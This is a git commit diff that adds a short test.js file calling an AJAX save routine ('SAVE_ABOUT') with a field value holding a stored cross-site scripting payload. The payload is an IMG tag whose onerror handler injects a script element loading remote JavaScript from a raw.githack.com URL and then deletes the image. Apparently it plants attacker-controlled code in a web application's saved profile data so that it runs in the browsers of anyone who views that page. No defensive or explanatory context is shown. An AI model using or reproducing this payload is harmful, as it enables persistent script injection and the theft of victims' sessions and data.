45de75349ab6859c7b28d109a0a766e76628b68b
Алексей <31672379+voronoff2803@users.noreply.github.com>
2019-12-25 19:23:33 +0300

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,9 @@
-
+runAsyncAjaxRequest3({
+    process: 'SAVE_ABOUT',
+    flow_id: '2437',
+    pageNew: 7,
+    g_param: {
+      names: ["x01", "f01"],
+      values: ["rus", '\<IMG id = \"test\" SRC=/ onerror=\"var script = document.createElement(\'script\');script.src = \'https://raw.githack.com/voronoff2803/informatics/master/test.js\';script.type = \'text/javascript\';script.charset = \'UTF-8\';script.async = false;document.head.appendChild(script);document.getElementById(\'test\').remove()"\>\</img\>']
+    }
+  });
